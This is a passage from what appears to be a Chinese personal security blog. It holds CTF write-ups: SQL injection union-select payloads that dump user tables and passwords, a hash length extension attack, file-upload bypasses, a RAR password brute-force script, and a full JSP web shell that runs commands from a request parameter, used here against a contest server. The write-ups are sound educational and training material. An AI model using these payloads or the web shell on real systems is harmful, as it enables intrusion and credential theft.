class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查数据库名，用户名</span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错） 得到数据库名</span><br><span class="line">2. 查表名：</span><br><span class="line">union select group_concat(0x0a,table_name),2 from information_schema.tables where table_schema=库名十六进制#</span><br><span class="line">（库名十六进制可以用database()代替）</span><br><span class="line">3. 查列名</span><br><span class="line">union select group_concat(0x0a,column_name),2 from information_schema.columns where table_schema=database() and table_name=’users’#</span><br><span class="line">（也可以把表名改为十六进制编码0x7573657273）</span><br><span class="line">4. 查需要的信息（用户名和密码）</span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,last_name,0x0a,user,0x0a,password,0x0a),2 from users #</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/比赛/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/30/比赛/" itemprop="url">近期比赛（按比赛时间及报名截止顺序）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T13:32:57+08:00">
                2018-09-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一、领航杯（4人）<br><a href="http://jyxxhd.jse.edu.cn/Competition/Newsnetwork/about/channelid/a5dada0d74c547d28f6a8f999afcd249" target="_blank" rel="noopener">http://jyxxhd.jse.edu.cn/Competition/Newsnetwork/about/channelid/a5dada0d74c547d28f6a8f999afcd249</a><br><code>2018.10.8~2018.10.9</code>（不过貌似延迟了）</p>
<p>二、“护网杯”首届工业互联网安全大赛（5人）<br><a href="http://www.huwangbei.cn/" target="_blank" rel="noopener">http://www.huwangbei.cn/</a><br>“护网杯”2018年网络安全防护赛暨首届工业互联网安全大赛，报名火热进行中。<br>目前已有来自于中央企业、基础电信企业、互联网企业、工业互联网企业、高校等千余支队伍报名参赛，报名时间将于10月10日截止。<br>报名时间：8月18日一10月10日<br>线上预选赛：<code>10.13</code><br>所有参赛人员须拥有唯一中国国籍(不合港澳台地区)，每支赛队成员不超过5人。<br>现场决赛：线上预选赛排名前60的战队可申请参加决赛，赛队人员应由同一企业、高校、事业单位人员组成，于10月19日前向赛事组委会提交加盖单位公章的报名表和个人身份证明。经组委会审核通过后，按照预赛排名取40支战队参赛。</p>
<p>三、上海大学生网络安全大赛（3人）</p>
<p>#报名截止时间：2018 年 10 月 28 日。 </p>
<p>##1、网络攻防赛预赛<br>时间为<code>11月3日08:00至11月4日8:00。</code>预赛为CTF在线解<br>题比赛，采取网络答题方式进行，各高校参赛队登录大赛官网<br>（<a href="http://www.ichunqiu.com/shwas）具体开放日期另行通知" target="_blank" rel="noopener">http://www.ichunqiu.com/shwas）具体开放日期另行通知</a><br>点击预赛链接，使用网络报名时注册的帐号密码登录预赛网址进行网络预<br>赛。网络攻防赛根据预赛成绩由高至低产生28支决赛队伍，其中上<br>海高校13支队伍，外省市15支队伍（注：外省市高校每校最多只允<br>许一支出线队伍参加决赛），详细名单将于11月11日前在公众号、<br>官方QQ群等公布</p>
<p>四、2018湖湘杯（3人）<br><a href="http://hxb.hunan.gov.cn/mobile/message" target="_blank" rel="noopener">http://hxb.hunan.gov.cn/mobile/message</a><br>   （一）海选队线上报名<br>　　定于2018年10月1日12时至11月8日24时<br>开放网络安全技能大赛比赛报名通道，符合参赛资格者凭大赛平台发出的短信或电子邮件通知参赛；</p>
<p>　　（二）海选队初赛<br>    <code>11月10日09:00至11日09:00</code><br>　　公布参加复赛资格名单：初赛结束后一周内在大赛官网公布，并以短信或电子邮件通知符合资格者参加复赛。</p>
<p>　　（二）海选队复赛<br>　　复赛时间：2018年11月18日10时至18日22时。<br>　　公布参加决赛资格名单：网络安全技能大赛复赛结束后一周在大赛官网公布网络安全技能大赛决赛名单。并以短信、电子邮件或者电话通知符合资格者赴长沙参加现场比赛。</p>
<p>　　（三）海选队和邀请队共同决赛<br>　　决赛分两场进行：<br>　　2018年11月26日举行第一场，上半场：08:00-12:30、下半场：14:00-19:00。期间12时30分至14时统一组织安排午餐，暂停比赛。<br>　　2018年11月27日举行第二场：08:00-13:00。</p>
<p>加油！<br><img src="/2018/09/30/比赛/hacker.jpg" alt=" "></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/29/1/" itemprop="url">中国矿业大学BXS实训平台WEB部分解析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T10:00:02+08:00">
                2018-09-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这个平台首先需要做出基础选择题才能做挑战的CTF题，好久没有写博客了，此处手动感谢Overwatch大佬帮我修好了博客<br>首先我们看题</p>
<h2 id="一、源代码"><a href="#一、源代码" class="headerlink" title="一、源代码"></a>一、源代码</h2><p><img src="/2018/09/29/1/源代码题目1.jpg" alt=" "><br>题目提示源代码，我们打开题目链接<br><img src="/2018/09/29/1/源代码题目2.jpg" alt=" "><br>看到BXS的Logo，由于题目提示源代码，所以我们点击鼠标右键查看源代码、如图：<br><img src="/2018/09/29/1/源代码.jpg" alt=" "><br>flag就在最下面<br><code>flag{youfindme23333333333}</code></p>
<h2 id="二、colorSnake"><a href="#二、colorSnake" class="headerlink" title="二、colorSnake"></a>二、colorSnake</h2><p><img src="/2018/09/29/1/color1.jpg" alt=" "><br>打开以后发现是个游戏，但是如果你真的想玩到50分，那就是你真的想多了hiahiahia~<br>我们还是先看一下网页源代码（这里我直接审查元素了ctrl+F12即可）如图：<br><img src="/2018/09/29/1/color2.jpg" alt=" "><br>我们看到关键的源码：<code>game.js</code><br>打开来看一下game.js具体内容，定位到关键函数<code>var game</code><br><img src="/2018/09/29/1/color3.jpg" alt=" "><br><img src="/2018/09/29/1/color4.jpg" alt=" "><br>具体来看一下这个说了点啥<br>可以看到要是访问到<code>getScore.php</code>分数就会增加，所以我们可以自己写一个访问这个链接的脚本（如果和我一样的编程菜鸡，不如试试手动不停访问，速度不能太快，不然会被判作弊）<br>看一下我们的对比图<br><img src="/2018/09/29/1/color5.jpg" alt=" "><br><img src="/2018/09/29/1/color6.jpg" alt=" "><br>可以看到分数是有改变的，一直到50就可以出flag了<br>另一种思路就是可以在控制台直接提交JS计时器，让他不停的访问<code>game.js</code><br>姿势如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123;</span><br><span class="line">               var r = JSON.parse(e);</span><br><span class="line">               if(r.state == 200)</span><br><span class="line">                   game.addScore(r.score);</span><br><span class="line">               else&#123;</span><br><span class="line">                   alert(r.msg);</span><br><span class="line">                   game.start()</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;)&#125;,1000)</span><br></pre></td></tr></table></figure><br>直接控制台提交坐等flag<br><img src="/2018/09/29/1/color7.jpg" alt=" "><br><code>flag{y0u_a4e_A_che4T_b0y}</code></p>
<h2 id="三、备份"><a href="#三、备份" class="headerlink" title="三、备份"></a>三、备份</h2><p><img src="/2018/09/29/1/备份1.jpg" alt=" "><br>题目提示说和备份有关<br><img src="/2018/09/29/1/备份2.jpg" alt=" "><br>我们点开网页查看源代码发现有1.bak和2.bak 在好奇心的驱使下，为什么不试试3.bak呢？<br>当尝试完我们发现1、2、3这三个都可以下载下来（当然里面内容没卵用23333）<br>况且源码提示了：There are too much baks in the website<br>可以写个脚本跑一下试试，说不定flag在后面某一个bak文件中<br>这里附上八一大佬的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding:utf-8</span><br><span class="line">   import requests</span><br><span class="line">   def traverse():</span><br><span class="line">       for i in range(0,1000):</span><br><span class="line">           t = requests.get(&apos;http://bxs.cumt.edu.cn/challenge/web/code/&apos;+str(i)+&apos;.bak&apos;)</span><br><span class="line">           if i%50 == 0:</span><br><span class="line">               print (i)</span><br><span class="line">           if &apos;flag&apos; in t.text:</span><br><span class="line">               print(t.text)</span><br><span class="line">           else :</span><br><span class="line">               continue</span><br><span class="line">   try:</span><br><span class="line">       traverse()</span><br><span class="line">   finally:</span><br><span class="line">       traverse()</span><br></pre></td></tr></table></figure><br>最后我们发现998.bak就是flag文件<br><code>flag{s0_s0_e@sy}</code></p>
<h2 id="四、自动获取flag"><a href="#四、自动获取flag" class="headerlink" title="四、自动获取flag"></a>四、自动获取flag</h2><p><img src="/2018/09/29/1/自动获取1.jpg" alt=" "><br>由题目可见，说了要改一下js代码，于是我们打开网页源代码查看<br><img src="/2018/09/29/1/自动获取2.jpg" alt=" "><br>我们先看一下js代码，看到里面有个param1.php<br><code>http://bxs.cumt.edu.cn/challenge/web/ctf0001/param1.php</code><br>我们访问看一下，可以看到<br><code>{&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;}</code><br>这是url编码，解码的到数组：<code>[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]</code><br>这param1应该是个求和函数（要是错了，欢迎各位大佬指导）<br>因为我们看到源码里第二个url应该是写错了的，所以改一下<br>第二个url对照第一个改为：param2.php?param=’+sum,但是程序中直接得到的参数是编码的，所以在程序中加上解码语句<code>d.param=unescape(d.param)</code><br>在控制台执行我们改完的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function calParam2(d)&#123;</span><br><span class="line">    d.param=unescape(d.param);</span><br><span class="line">    var data=JSON.parse((d.param));</span><br><span class="line">    var length=data.length;</span><br><span class="line">    var second=new Date().getSeconds();</span><br><span class="line">    var sum=0;</span><br><span class="line">    for (var i = 1; i &lt; length; i++) &#123;</span><br><span class="line">        for (var j = 0; j &lt; length/2; j++) &#123;</span><br><span class="line">            sum+=parseInt(data[i])*second + data[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 请求flag</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&apos;param2.php?param=&apos;+sum,</span><br><span class="line">        method:&apos;get&apos;,</span><br><span class="line">        dataType:&apos;json&apos;,</span><br><span class="line">        success:function(s)&#123;</span><br><span class="line">            alert(s.f);</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        error:function(s)&#123;</span><br><span class="line">            alert(&apos;错了&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">   </span><br></pre></td></tr></table></figure></p>
<p>最后贴上flag<br><code>flag{hello,This is A Gift FoRm PHP&amp;JS; O(∩_∩)O~}</code></p>
<h2 id="五、cookie？"><a href="#五、cookie？" class="headerlink" title="五、cookie？"></a>五、cookie？</h2><p><img src="/2018/09/29/1/cooike1.jpg" alt=" "><br>既然说了纯属娱乐送分，就不要想太难了~<br>进去以后会提示：请以管理员身份登陆<br>于是我们打开Burp进行抓包<br>了解burp怎么使用请<a href="https://blog.csdn.net/gitchat/article/details/79168613" target="_blank" rel="noopener">点击这里</a><br>这是们抓的包<br><img src="/2018/09/29/1/cooike2.jpg" alt=" "><br>可以看到<code>Cookie: user=guest;</code><br>题目说的必须管理员身份打开，所以修改为<code>Cookie: user=admin;</code>重新发包即可。<br>会得到这个东西<br><img src="/2018/09/29/1/cooike3.jpg" alt=" "><br>图片下载下来<br><img src="/2018/09/29/1/cooike4.jpg" alt=" "><br>丢进百度识图知道这个人叫维吉尼亚，但是维吉尼亚密码不是他发明的，只是命名而已。<br>然后找到在线解维吉尼亚的网站，推荐<code>www.ctftools.com</code><br>输入图片下面的字符串，可以看到图片上面有提示：<code>key：e</code><br>所以密钥我们输入：e<br>如下图<br><img src="/2018/09/29/1/cooike5.jpg" alt=" "><br>点击解密即可得到flag<br>flag<code>thisisanoldencrypt</code></p>
<h2 id="六、phpmywind"><a href="#六、phpmywind" class="headerlink" title="六、phpmywind"></a>六、phpmywind</h2><p>本来应该比较难的一道题目，但是配置有点问题，直接报出flag<br><img src="/2018/09/29/1/php1.jpg" alt=" "><br><code>flag{327A6C4304AD5938EAF0EFB6CC3E53DC}</code></p>
<h2 id="七、is-hash-safe"><a href="#七、is-hash-safe" class="headerlink" title="七、is hash safe??"></a>七、is hash safe??</h2><p><img src="/2018/09/29/1/hash.jpg" alt=" "><br>打开提示只有admin可以登录，抓包修改guest为admin无果,看到后面还有一串hsh=<br>看到题目说有东西没有删干净，于是找一下<code>admin.php.swp</code>(常见的备份文件)<br><img src="/2018/09/29/1/hash1.jpg" alt=" "><br>可以下载下来一个，<code>admin.php.swp</code>文件<br>不知道swp文件是什么的可以<a href="https://blog.csdn.net/weixin_38133867/article/details/78671626" target="_blank" rel="noopener">点击这里</a><br>使用<code>Vim</code>恢复<code>vim -r index.php.swp</code><br><img src="/2018/09/29/1/hash3.jpg" alt=" "><br>看到代码立有<code>cumtctf{you_know_this_is_not_the_flag}</code>假的flag<br>因为前面说到有hsh=……<br>所以来试试哈希长度扩展攻击</p>
<h3 id="哈希长度扩展攻击-hash-length-extension-attacks-是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了-H-密钥-∥-消息-此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。"><a href="#哈希长度扩展攻击-hash-length-extension-attacks-是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了-H-密钥-∥-消息-此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。" class="headerlink" title="哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。"></a>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</h3><h3 id="如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature-签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出-secret-data-attacker-controlled-data-的哈希值。"><a href="#如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature-签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出-secret-data-attacker-controlled-data-的哈希值。" class="headerlink" title="如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。"></a>如果一个应用程序是这样操作的：准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。</h3><p>这里需要hashpump工具<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">点击此处</a><br>在linux下安装就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><br>安装好后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: c70ab9d039f166c5b5f506a5698ebaa1</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">37d0fe2c401a689be9608e9f850ef3de</span><br><span class="line">guest%80%00%00%x00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure><br>最后把cooike改成<code>role=guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin;hsh=37d0fe2c401a689be9608e9f850ef3de</code>即可<br><img src="/2018/09/29/1/hash4.jpg" alt=" "><br>flag<code>cumtctf{Md5_1s_n0t_safe}</code></p>
<h2 id="八、上传1-amp-2"><a href="#八、上传1-amp-2" class="headerlink" title="八、上传1&amp;2"></a>八、上传1&amp;2</h2><p><img src="/2018/09/29/1/上传1.jpg" alt=" "><br>打开题目发现是最简单的上传、肯定不能传jpg上去，因为那样不会可执行<br>所以我们抓包。<br>改后缀为php<br>然后就可以看到flag，上传一和二的flag都有了，上传三会比较复杂题解暂不给出<br><img src="/2018/09/29/1/上传.jpg" alt=" "><br><code>flag{D0_y0u_KNow_J@v@Scr1pt}</code><br><code>flag{D0_y0u_KNow_How_t0_use_PHP_to_check_F1le}</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/30/Redhat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/30/Redhat/" itemprop="url">Redhat2018 WP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T11:19:14+08:00">
                2018-04-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>国赛打完又是redhat~不过国赛辣鸡赛制让我们白打了（小声吐槽一波游戏体验极差的国赛）<br>1.Misc 签到<br>看管理员名片（后来直接在群里放出）<br><code>签到题的flag为 flag{redhat_welcome}</code></p>
<p>2.Web<br>simple upload<br>打开是个登录页面，可题目说是上传，于是扫一下目录，发现有upload.html<br>打开果然是上传<br>随便传一个文件发现文件发现没有回显，于是打开BP抓一下包，可能需要改一下类型<br>先开始可能是没睡醒、、一直传php的马，结果被学长一语点醒。。。。这就是不是php网页你搞什么php<br>然后试一下报错页面，会看到服务器信息<br><img src="/2018/04/30/Redhat/报错.jpg" alt=" "><br>搜一下发现有一些CVE，可是没什么利用的，所以还是上传问题，想了半天也不知道网站后端用啥写的、、怕是经验太少了<br>后来百度突然发现Tomcat大部分都是java写的，然后百度各种jsp马及利用方法，终于找到了一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>然后生成.jsp木马<br>打开BP上传，改一下admin为真，类型怕有过滤，改成image/png最保险~<br>如图<br><img src="/2018/04/30/Redhat/BP.jpg" alt=" "><br>然后现在得到了上传的地址。。。菜刀连一下发现菜刀没有jsp马这个选项、、然后上hackbar<br>百度jsp马使用规则<br>最后构造payload为：<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023
&amp;i=pwd</code><br>打开如下<br><img src="/2018/04/30/Redhat/root.jpg" alt=" "><br>发现可以读文件，后面又考察了linux系统一些基本操作（结果我有点菜hhh~）<br>然后改一下i为../ls可以读出文件列表<br>然后读一下flag文件<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023
&amp;i=cat /flag</code><br>得到flag<br><code>flag{bdfa6be5-b026-4a90-8fbd-17f9df63cba3}</code></p>
<p>3.NotOnlyWireshark<br>打开是个流量包<br>导出一下http对象<br>发现一些很奇怪的东西如图<br><img src="http.jpg" alt=" ">看起来像文件头，于是把他们后三位全部提取出来<br>生成一个zip文件<br><img src="/2018/04/30/Redhat/zip.jpg" alt=" "><br>继续做下去发现思路没错，就是zip包里有文件<br>于是打开，结果要密码、、、<br><img src="/2018/04/30/Redhat/zip1.jpg" alt=" "><br>这时候和密码有关的只有先开始的流量包了<br>去找找<br>发现<br><img src="/2018/04/30/Redhat/key1.jpg" alt=" "><br>key就是这个鬼东西了、、、出题人神脑洞！！！！<br><code>?id=1128%23</code><br>打开就会显示flag<br><code>flag{1m_s0_ang4y_1s}</code></p>
<p>4.听说你们喜欢手工爆破<br>下载下来是个OS镜像文件，百度一下知道这个文件可以直接解压查看<br><img src="/2018/04/30/Redhat/解压.jpg" alt=" "><br>都是1K的文件，怀疑一下文件名、、往下发现有个rar包<br>打开需要密码，这时候就得爆破了<br>想到这些文件名作为字典爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import os.path</span><br><span class="line">rootdir = &quot;C:/Users/admin/Desktop/OS_038c9291c8039792d1aad140f6664671&quot;</span><br><span class="line"></span><br><span class="line">file_object = open(&apos;train_list.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">for parent,dirnames,filenames in os.walk(rootdir):</span><br><span class="line">    for filename in filenames:</span><br><span class="line">        file_object.write(filename.rstrip(&apos;.txt&apos;)+ &apos;\n&apos;)</span><br><span class="line">file_object.close()</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">f=open(&apos;train_list.txt&apos;)</span><br><span class="line">s=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">for p in s:</span><br><span class="line">    cmd = &quot;winrar e 1.rar -y -p%s&quot; % (p)</span><br><span class="line">    r = os.system(cmd)</span><br><span class="line">    if r == 0:</span><br><span class="line">        print(&quot;pass = %s&quot; % p)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><br>这个需要添加下winrar环境变量<br>rar文件就被打开了<br><img src="/2018/04/30/Redhat/rar.jpg" alt=" "><br>里面有个word文档，还是需要密码、、、、<br>上一波小工具<br><img src="/2018/04/30/Redhat/word.jpg" alt=" "><br>打开是一篇文档、、、、百度一下发现名字叫《海边的曼彻斯特》<br>应该是曼彻斯特编码<br>参考一下dalao博客<br><a href="https://www.xmsec.cc/manchester-encode/" target="_blank" rel="noopener">https://www.xmsec.cc/manchester-encode/</a><br>贴一波脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=0x123654AAA678876303555111AAA77611A321</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">bs=&apos;0&apos;+bin(a)[2:]</span><br><span class="line">a=&apos;&apos;</span><br><span class="line">def conv(s):</span><br><span class="line">    return hex(int(s,2))[2:]</span><br><span class="line">for i in range(0,len(bs),2):</span><br><span class="line">    if bs[i:i+2]==&apos;01&apos;:</span><br><span class="line">        a+=&apos;0&apos;</span><br><span class="line">    else:</span><br><span class="line">        a+=&apos;1&apos;</span><br><span class="line">print (a)</span><br><span class="line">for i in 